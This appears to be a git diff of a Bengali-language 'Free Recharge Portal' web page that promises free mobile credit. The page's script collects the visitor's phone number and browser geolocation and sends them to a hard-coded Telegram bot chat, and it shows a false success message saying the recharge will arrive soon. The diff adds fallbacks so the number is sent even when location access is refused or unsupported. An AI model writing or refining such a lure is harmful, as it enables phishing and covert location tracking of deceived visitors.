@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Recharge 2026</title>
+    <title>Free Recharge Portal</title>
     <style>
         body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding: 20px; }
         .box { max-width: 400px; margin: 40px auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
         h2 { color: #28a745; }
-        input { width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; outline: none; }
+        input { width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; }
         .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
@@ -35,15 +35,20 @@ async function sendData() {
     const chat_id = "7887080882";
 
     // লোকেশন পাওয়ার চেষ্টা করবে, না পেলেও মেসেজ পাঠাবে
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        const text = `🔔 **নতুন রিচার্জ রিকোয়েস্ট (লোকেশনসহ)**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const text = `🔔 **নতুন রিকোয়েস্ট (লোকেশনসহ)**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
+            await sendMessage(token, chat_id, text);
+        }, async (err) => {
+            // লোকেশন ব্লক থাকলে এই অংশটি কাজ করবে
+            const text = `⚠️ **নতুন রিকোয়েস্ট (লোকেশন ব্লক)**\n\n📱 নম্বর: ${num}\n❌ ইউজার লোকেশন পারমিশন দেয়নি।`;
+            await sendMessage(token, chat_id, text);
+        }, { timeout: 5000 });
+    } else {
+        const text = `⚠️ **নতুন রিকোয়েস্ট (লোকেশন সাপোর্ট নেই)**\n\n📱 নম্বর: ${num}`;
         await sendMessage(token, chat_id, text);
-    }, async (err) => {
-        // লোকেশন না পেলেও এই অংশটি নম্বরটি পাঠিয়ে দেবে
-        const text = `⚠️ **নতুন রিচার্জ রিকোয়েস্ট (লোকেশন ছাড়া)**\n\n📱 নম্বর: ${num}\n❌ লোকেশন ব্লক করা ছিল।`;
-        await sendMessage(token, chat_id, text);
-    }, { timeout: 5000 });
+    }
 }
 
 async function sendMessage(token, chat_id, text) {
@@ -53,10 +58,10 @@ async function sendMessage(token, chat_id, text) {
         if(res.ok) {
             alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
         } else {
-            alert("বট সমস্যা! টোকেন চেক করুন।");
+            alert("বট কানেকশনে সমস্যা!");
         }
     } catch (e) {
-        alert("নেটওয়ার্ক সমস্যা!");
+        alert("নেটওয়ার্ক ত্রুটি!");
     } finally {
         const btn = document.getElementById('subBtn');
         btn.innerText = "রিচার্জ নিন";
